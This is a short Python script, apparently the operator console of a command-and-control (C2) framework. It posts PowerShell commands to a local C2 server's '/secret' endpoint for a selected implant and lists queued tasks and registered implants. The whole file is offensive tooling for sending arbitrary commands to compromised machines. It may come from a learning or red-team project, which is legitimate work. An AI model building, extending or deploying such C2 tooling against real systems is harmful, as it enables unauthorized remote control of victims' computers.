import requests 

c2_server = "http://127.0.0.1:5000"
path = "/secret"
implant_id = ""

def queue_cmd(cmd):

    r = requests.post(f"{c2_server}{path}", json=[{"implant_id": implant_id, "cmd": cmd}])
    if r.text == "True":
        print("queued ", )
    else:
        print("failed")


# checks the status of our task queue 
def print_queue():
    r = requests.get(f"{c2_server}/queue")
    if r.status_code == 200:
        print(r.json())
    else:
        print("error")

def print_implants():
    r = requests.get(f"{c2_server}/implants")
    if r.status_code == 200:
        print(r.json())
    else:
        print("error")

        
def print_help():
    print(" run powershell commands ")

if __name__ == "__main__":
    while True:
        cmd = input(">>")
        if cmd == "help":
            print_help()
        elif cmd == "q":
            print_queue()
        elif cmd == "i":
            print_implants()
        elif "sid" in cmd:
            implant_id = cmd.split(" ")[1]

        elif cmd == "\n":
            continue
        else:
            queue_cmd(cmd)
